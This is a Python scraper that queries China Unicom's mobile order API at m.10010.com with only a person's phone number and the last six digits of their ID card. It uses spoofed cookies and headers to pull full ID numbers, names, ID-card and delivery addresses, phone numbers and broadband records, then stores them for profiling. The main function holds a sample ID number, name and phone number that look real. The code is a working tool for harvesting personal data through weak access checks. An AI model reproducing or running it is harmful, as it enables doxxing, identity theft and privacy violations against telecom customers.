#!/lib/anaconda2/bin/python
# -*- coding: utf-8 -*-
'''
Created on 2018-01-16 16:15:43

@author: Maxing
'''

import sys
import json
import time
import copy
import signal
import gevent
import requests

from gevent import monkey
from utils.value_formater import format_value_list
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from tools import save_file, channel_1, channel_3, aes_1, aes_2, field_handle, get_logger

reload(sys)
sys.setdefaultencoding("utf-8")
reload(sys)

script_log = get_logger('script')

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

monkey.patch_all()

'''
招联牛卡
使用手机号和身份证后6位,
查询包括身份证号码在内的其他相关信息
'''

class_name = "zhaolianniuka"

save_order_filename = "zhaolianniuka_order"
save_kuandai_filename = "zhaolianniuka_kuandai"

order_item_header = "psptTypeCode^psptNo^psptNoSecrite^psptAddr^schoolName^custName^goodsName^createDate^createTime^payWayName^payTypeName^orderStateName^deliverCompanyName^dispatchName^dlvTypeName^postPhone^provinceName^provinceCode^cityName^cityCode^districtName^districtCode^postAddr^receiverName^attrName^attrValName^attrValDesc^attrValCode"
kuandai_item_header = "cardId^home^phone^provinceCode^city^time^address^province^userName^userAddressNew^district^appdate"

timeout_ratio = 3


class Zhaolianniuka(object):
    def __init__(self):
        self.cookies = {
            'u_mobilePhone': '',
            'u_psptId': '',
            'MUT_V': '',
            'SHOP_PROV_CITY': '',
            '_n3fa_cid': '51a6049c1bfb4468c4f0bd6c2bcb66ad',
            '_n3fa_ext=ft': '',
            '_n3fa_lpvt_a9e72dfe4a54a20c3d6e671b3bad01d9': '',
            '_n3fa_lvt_a9e72dfe4a54a20c3d6e671b3bad01d9': '',
            'gipgeo': '51|540',
            'mallcity': '51|540',
        }

        self.headers = {
            'Host': 'm.10010.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Referer': 'http://m.10010.com/mfront/views/my-order/main.html',
            'Connection': 'keep-alive',
        }

        self.base_url = 'http://m.10010.com/MpApp/api/umyorder'
        self.order_count_url = 'http://m.10010.com/MpApp/api/umyorder/orderCount'
        self.broadband_url = 'http://m.10010.com/MpApp/api/umyorder/broadbandOrder/list?businessType='

    def download(self, url, phone, to, psptid, store_url, order_id=None):
        retry = 0
        headers = copy.deepcopy(self.headers)
        cookies = copy.deepcopy(self.cookies)
        headers['storeUrl'] = store_url
        cookies['u_mobilePhone'] = phone
        cookies['u_psptId'] = psptid

        while 1:
            if retry > 5:
                script_log.warning("zhaolianniuka error, connect error")
                return ('', '', '')

            try:
                timestamp = int(time.time())
                cookies['_n3fa_ext=ft'] = str(timestamp)
                if url == self.broadband_url:
                    cookies['_n3fa_lvt_a9e72dfe4a54a20c3d6e671b3bad01d9'] = ','.join(
                        [str(timestamp + 2354), str(timestamp + 24732), str(timestamp + 83975),
                         str(timestamp + 100573)])
                    cookies['_n3fa_lpvt_a9e72dfe4a54a20c3d6e671b3bad01d9'] = str(
                        timestamp + 100573)
                else:
                    cookies['_n3fa_lpvt_a9e72dfe4a54a20c3d6e671b3bad01d9'] = str(
                        timestamp)
                    cookies['_n3fa_lvt_a9e72dfe4a54a20c3d6e671b3bad01d9'] = str(
                        timestamp)

                r = requests.get(url=url, headers=headers, cookies=cookies,
                                 allow_redirects=False, timeout=to * timeout_ratio)  # , proxies=self.proxies)
                if r.status_code == 200:
                    return r.json(), phone, psptid
                else:
                    retry += 1
            except Exception:
                retry += 1

    # 获取订单的列表页
    def get_order_list(self, url, phone, psptid, to):
        store_url = 'http://m.10010.com/mfront/views/my-order/main.html#/orderlist?oneKey=t&refresh_sign=1'
        return self.download(url, phone, to, psptid, store_url)

    # 获得订单数量概览,判断是否有宽带订单
    def get_order_count(self, url, phone, psptid, to):
        store_url = 'http://m.10010.com/mfront/views/my-order/main.html#/orderlist?oneKey=t&refresh_sign=3'
        return self.download(url, phone, to, psptid, store_url)

    # 获取普通订单的详情信息
    def get_normal_order_detail(self, url, phone, psptid, order_id, to):
        store_url = 'http://m.10010.com/mfront/views/my-order/main.html#/myorder/{}?oneKey=t&refresh_sign=2&sourceFrom=0'.format(
            order_id)
        return self.download(url, phone, to, psptid, store_url, order_id)

    # 获取宽带订单的详情信息
    def get_broadband_order_detail(self, url, phone, psptid, to):
        store_url = 'http://m.10010.com/mfront/views/my-order/main.html#/broadbandorder?oneKey=t&refresh_sign=7'
        return self.download(url, phone, to, psptid, store_url)


def batch_order(id_number, phone, to):
    broadband_detail_list = []
    order_detail_param_list = []

    z_l_n_k = Zhaolianniuka()

    normal_order_tasks = []  # 普通订单
    broadband_order_tasks = []  # 宽带订单

    phone = phone
    psptid = id_number

    gevent.joinall(normal_order_tasks)
    gevent.joinall(broadband_order_tasks)

    # 普通订单详情
    # 先跑出所有的普通订单的ID,然后再跑所有的订单详情

    list_json, phone, psptid = z_l_n_k.get_order_list(z_l_n_k.base_url, phone, psptid, to)

    if list_json and len(list_json) > 0:
        for l_j in list_json:
            order_id = '0'
            try:
                order_id = l_j.get('orderId')
            except Exception:
                pass

            if order_id:
                # 保存查询详情的参数
                # 这里改成按ID取对象
                # save_detail_para_file = os.sep.join([sys.path[0], 'detail_order_para_{}.txt'])
                order_detail_param_list.append(','.join([order_id, phone, psptid]))

                # 宽带订单详情
    b_o_l, phone, psptid = z_l_n_k.get_order_count(z_l_n_k.order_count_url, phone, psptid, to)
    if b_o_l:
        count_of_broadband = b_o_l.get('countOfBroadband')
        if count_of_broadband > 0:
            broadband, phone, psptid = z_l_n_k.get_broadband_order_detail(
                z_l_n_k.broadband_url, phone, psptid, to)
            if broadband:
                broadband_detail_list.extend(broadband)

    return broadband_detail_list, order_detail_param_list


def batch_detail_order(order_detail_param_list, to):
    order_detail_list = []

    z_l_n_k = Zhaolianniuka()

    for b_p in order_detail_param_list:
        if b_p == "":
            continue
        order_id, phone, psptid = b_p.strip().split(',')
        url = ''.join([z_l_n_k.base_url, '/' + order_id, '?sourceFrom=0'])

        order_json, phone, psptid = z_l_n_k.get_normal_order_detail(url, phone, psptid, order_id, to)
        if order_json:
            order_detail_list.append(order_json)

    return order_detail_list


def querry(task, to):
    id_number = task.get("person", {}).get("idnum", "")
    phone = task.get("person", {}).get("phone", "")

    id_number = id_number[-6:]

    result = query(id_number, phone, to)

    # result = process_one_with_dict(json.dumps(result_dict))

    return result


def query(id_number, phone, to):
    broadband_detail_list, order_detail_param_list = batch_order(id_number, phone, to)
    order_detail_list = batch_detail_order(order_detail_param_list, to)

    order_result_list = []
    broadband_result_list = []

    for order in order_detail_list:
        order_result_list.append(order)

    for broadband in broadband_detail_list:
        broadband_result_list.append(broadband)

    return order_result_list, broadband_result_list


def query_wrap(task, to):
    try:
        order_result_list, broadband_result_list = querry(task, to)

        id_number = task.get("person", {}).get("idnum", "")

        channel_value_set = set()

        # ========== file ========== #

        order_value_lists = process_order_for_file(order_result_list)
        for value_list in order_value_lists:
            value_str = "^".join(value_list)

            save_file(save_order_filename, head=order_item_header, file=value_str)

        kuandai_value_lists = process_kuandai_for_file(id_number, broadband_result_list)
        for value_list in kuandai_value_lists:
            value_str = "^".join(value_list)

            save_file(save_kuandai_filename, head=kuandai_item_header, file=value_str)

        # ========== channel 1 ========== #

        channel_1_order_value_list = process_order_for_channel_1(id_number, order_result_list)
        for channel_value in channel_1_order_value_list:
            value_str = "^".join(channel_value)

            if hash(value_str) not in channel_value_set:
                channel_value_set.update([hash(value_str)])
                channel_1(channel_value)

        channel_1_kunadai_value_list = process_broadband_for_channel_1(id_number, broadband_result_list)
        for channel_value in channel_1_kunadai_value_list:
            value_str = "^".join(channel_value)

            if hash(value_str) not in channel_value_set:
                channel_value_set.update([hash(value_str)])
                channel_1(channel_value)

        # ========== channel 3 ========== #
        channel_3_order_value_list = process_order_for_channel_3(id_number, order_result_list)
        for channel_value in channel_3_order_value_list:
            value_str = "^".join(channel_value)

            if hash(value_str) not in channel_value_set:
                channel_value_set.update([hash(value_str)])
                channel_3(channel_value)

        channel_3_kunadai_value_list = process_broadband_for_channel_3(id_number, broadband_result_list)
        for channel_value in channel_3_kunadai_value_list:
            value_str = "^".join(channel_value)

            if hash(value_str) not in channel_value_set:
                channel_value_set.update([hash(value_str)])
                channel_3(channel_value)
    except:
        script_log.warning("zhaolianniuka crawled failed, task: {}".format(task))


def process_order_for_channel_1(id_number, order_result_list):
    order_value_lists = []

    for order_result in order_result_list:
        order_result = extract_order_data(json.dumps(order_result))

        if order_result.get("orderStateName", "") == u"交易成功":
            for phone in order_result.get("phones", []):
                value_list = [
                    aes_1(field_handle(id_number)),  # idnumber
                    aes_2(field_handle(phone)),  # c_phone
                    u"本人",  # relation
                    field_handle(order_result.get("custName")),  # c_name
                    "",  # comment
                    "1",  # level
                ]

                order_value_lists.append(value_list)

    return order_value_lists


def process_broadband_for_channel_1(id_number, broadband_result_list):
    kuandai_value_lists = []

    for broadband_result in broadband_result_list:
        broadband_result = extract_broad_data(json.dumps(broadband_result))

        value_list = [
            aes_1(field_handle(id_number)),  # idnumber
            aes_2(field_handle(broadband_result.get("phone", ""))),  # c_phone
            u"本人",  # relation
            field_handle(broadband_result.get("userName", "")),  # c_name
            "",  # comment
            "1",  # level
        ]

        value_list = format_value_list(value_list)

        kuandai_value_lists.append(value_list)

    return kuandai_value_lists


def process_order_for_channel_3(id_number, order_result_list):
    order_value_lists = []

    for order_result in order_result_list:
        order_result = extract_order_data(json.dumps(order_result))
        if order_result.get("orderStateName", "") == u"交易成功":

            addr_dict = {u"户籍地址": order_result.get("personal_address"),
                         u"居住地址": order_result.get("living_address")}

            try:
                phone = order_result.get("phones")[0]
            except:
                phone = ""

            for addr_type, addr in addr_dict.items():
                value_list = [
                    aes_1(field_handle(id_number)),  # idnumber
                    u"本人",  # relation
                    "",  # comment
                    field_handle(order_result.get("custName")),  # c_name
                    aes_2(field_handle(phone)),  # c_phone
                    field_handle(addr_type),  # type
                    aes_2(field_handle(addr)),  # address
                    "1",  # level
                ]

                value_list = format_value_list(value_list)

                order_value_lists.append(value_list)

    return order_value_lists


def process_broadband_for_channel_3(id_number, broadband_result_list):
    kuandai_value_lists = []

    for broadband_result in broadband_result_list:
        broadband_result = extract_broad_data(json.dumps(broadband_result))

        value_list = [
            aes_1(field_handle(id_number)),  # idnumber
            u"本人",  # relation
            "",  # comment
            field_handle(broadband_result.get("userName", "")),  # c_name
            aes_2(field_handle(broadband_result.get("phone", ""))),  # c_phone
            u"居住地址",  # type
            aes_2(field_handle(broadband_result.get("address", ""))),  # address
            "1",  # level
        ]

        value_list = format_value_list(value_list)

        kuandai_value_lists.append(value_list)

    return kuandai_value_lists


def process_order_for_file(order_result_list):
    order_value_lists = []

    for order_result in order_result_list:
        order_result = extract_order_data(json.dumps(order_result))

        value_list = [
            order_result.get("psptTypeCode", ""),
            order_result.get("psptNo", ""),
            order_result.get("psptNoSecrite", ""),
            order_result.get("psptAddr", ""),
            order_result.get("schoolName", ""),
            order_result.get("custName", ""),
            order_result.get("goodsName", ""),
            order_result.get("createDate", ""),
            order_result.get("createTime", ""),
            order_result.get("payWayName", ""),
            order_result.get("payTypeName", ""),
            order_result.get("orderStateName", ""),
            order_result.get("deliverCompanyName", ""),
            order_result.get("dispatchName", ""),
            order_result.get("dlvTypeName", ""),
            order_result.get("postPhone", ""),
            order_result.get("provinceName", ""),
            order_result.get("provinceCode", ""),
            order_result.get("cityName", ""),
            order_result.get("cityCode", ""),
            order_result.get("districtName", ""),
            order_result.get("districtCode", ""),
            order_result.get("postAddr", ""),
            order_result.get("receiverName", ""),
            order_result.get("attrName", ""),
            order_result.get("attrValName", ""),
            order_result.get("attrValDesc", ""),
            order_result.get("attrValCode", ""),
        ]

        value_list = format_value_list(value_list)

        order_value_lists.append(value_list)

    return order_value_lists


def process_kuandai_for_file(id_number, broadband_result_list):
    kuandai_value_lists = []

    for broadband_result in broadband_result_list:
        broadband_result = extract_broad_data(json.dumps(broadband_result))

        value_list = [
            id_number,
            broadband_result.get("home", ""),
            broadband_result.get("phone", ""),
            broadband_result.get("provinceCode", ""),
            broadband_result.get("city", ""),
            broadband_result.get("time", ""),
            broadband_result.get("address", ""),
            broadband_result.get("province", ""),
            broadband_result.get("userName", ""),
            broadband_result.get("userAddressNew", ""),
            broadband_result.get("district", ""),
            broadband_result.get("appdate", ""),
        ]

        value_list = format_value_list(value_list)

        kuandai_value_lists.append(value_list)

    return kuandai_value_lists


def extract_order_data(line):
    # 普通订单字段
    normal_order = {
        # 订单基本信息
        'createDate': '',  # 订单创建时间
        'createTime': '',  # 订单创建具体时间
        'payWayName': '',  # 付款状态
        'payTypeName': '',  # 支付类型
        'orderStateName': '',  # 订单状态

        # 快递相关信息
        'deliverCompanyName': '',  # 快递公司名
        'dispatchName': '',  # 派送方式
        'dlvTypeName': '',  # 送货时间
        'postPhone': '',  # 联系手机号
        'provinceName': '',  # 快递地址所在省份,
        'provinceCode': '',  # 快递省份邮政编码
        'cityName': '',  # 快递地址所在城市名
        'cityCode': '',  # 快递地址所在城市邮编
        'districtName': '',  # 快递地址所在区
        'districtCode': '',  # 收货地址所在区邮政编码
        'postAddr': '',  # 快递收货地址
        'receiverName': '',  # 收件人

        # 个人信息
        'psptTypeCode': '',  # 证件类型
        'psptNo': '',  # 证件号
        'psptNoSecrite': '',  # 证件号(带*)
        'psptAddr': '',  # 证件地址
        'schoolName': '',  # 学校名称
        'custName': '',  # 客户名称

        # 商品信息
        'goodsName': '',  # 产品名称

        # 以下参数只取goods中attrValName为手机号的
        'attrName': u'号码',  # 产品属性名称(只取为"号码"的,所以一定是"号码")
        'attrValName': '',  # 产品属性变量名(一般为手机号)
        'attrValDesc': '',  # 产品属性变量描述
        'attrValCode': '',  # 产品属性变量代码

        # 电话集
        'phones': [],

        # 地址
        'living_address': "",
        'personal_address': ""
    }

    item = json.loads(line.replace('": null', '": ""'))
    normal_order['createDate'] = item.get('createDate', '')
    normal_order['createTime'] = item.get('createTime', '')
    normal_order['payWayName'] = item.get('payWayName', '')
    normal_order['payTypeName'] = item.get('payTypeName', '')
    normal_order['orderStateName'] = item.get('orderStateName', '')
    normal_order['deliverCompanyName'] = item.get('deliverCompanyName', '')
    normal_order['dispatchName'] = item.get('dispatchName', '')
    normal_order['dlvTypeName'] = item.get('dlvTypeName', '')
    normal_order['postPhone'] = item.get('postPhone', '')
    normal_order['provinceName'] = item.get('provinceName', '')
    normal_order['provinceCode'] = item.get('provinceCode', '')
    normal_order['cityName'] = item.get('cityName', '')
    normal_order['cityCode'] = item.get('cityCode', '')
    normal_order['districtName'] = item.get('districtName', '')
    normal_order['districtCode'] = item.get('districtCode', '')
    normal_order['postAddr'] = item.get('postAddr', '')
    normal_order['receiverName'] = item.get('receiverName', '')

    netIn_info = item.get('netIn', '')
    if netIn_info:
        normal_order['psptTypeCode'] = netIn_info.get('psptTypeCode', '')
        normal_order['psptNo'] = netIn_info.get('psptNo', '')
        normal_order['psptNoSecrite'] = netIn_info.get('psptNoSecrite', '')
        normal_order['psptAddr'] = netIn_info.get('psptAddr', '')
        normal_order['schoolName'] = netIn_info.get('schoolName', '')
        normal_order['custName'] = netIn_info.get('custName', '')

    goods_info = item.get('goods', '')

    if goods_info:
        normal_order['goodsName'] = goods_info[0].get('goodsName', '')
        goods_attr = goods_info[0].get('attr', '')
        for g_t in goods_attr:
            attrName = g_t.get('attrName', '')
            attrValName = g_t.get('attrValName', '')
            attrValDesc = g_t.get('attrValDesc', '')
            attrValCode = g_t.get('attrValCode', '')
            if attrName == u'号码':
                normal_order['attrName'] = attrName
                normal_order['attrValName'] = attrValName
                normal_order['attrValDesc'] = attrValDesc
                normal_order['attrValCode'] = attrValCode

    normal_order["phones"].append(normal_order['postPhone'])
    normal_order["phones"].append(normal_order['attrValName'])

    post_addr = "".join([normal_order['provinceName'], normal_order['cityName'], normal_order['districtName'],
                         normal_order['postAddr']])

    normal_order["living_address"] = post_addr
    normal_order["personal_address"] = normal_order['psptAddr']

    return normal_order


def extract_broad_data(line):
    # 宽带字段
    kuandai_order = {
        'cardId': '',  # 身份证号
        'home': '',  # 家庭信息
        'phone': '',  # 电话
        'provinceCode': '',  # 省份代码
        'city': '',  # 城市
        'time': '',  # 记录时间
        'address': '',  # 地址
        'province': '',  # 省份
        'userName': '',  # 用户姓名
        'userAddressNew': '',  # 用户新地址
        'district': '',  # 地区
        'appdate': '',  # 申请日期
    }

    item = json.loads(line.replace('null', '""'))
    kuandai_order['cardId'] = item.get('cardId', '')
    kuandai_order['home'] = item.get('home', '')
    kuandai_order['phone'] = item.get('phone', '')
    kuandai_order['provinceCode'] = item.get('provinceCode', '')
    kuandai_order['city'] = item.get('city', '')
    kuandai_order['time'] = item.get('time', '')
    kuandai_order['address'] = item.get('address', '')
    kuandai_order['province'] = item.get('province', '')
    kuandai_order['userName'] = item.get('userName', '')
    kuandai_order['userAddressNew'] = item.get('userAddressNew', '')
    kuandai_order['district'] = item.get('district', '')
    kuandai_order['appdate'] = item.get('appdate', '')

    return kuandai_order


def main():
    task = {
        u'date': u'03',
        u'person':
            {
                u'idnum': u'34032319921223001X',
                u'name': u'孟成',
                u'phone': u'18576656446'
            },
        u'entrance': u"[u'1', u'2', u'3']",
        u'retry': u'1',
        u'task_id': u'120103195506014210'
    }

    # 如果这是传整个 task 进来的话
    # query_wrap(task, 10)


if __name__ == '__main__':
    main()
    # batch_detail_order()
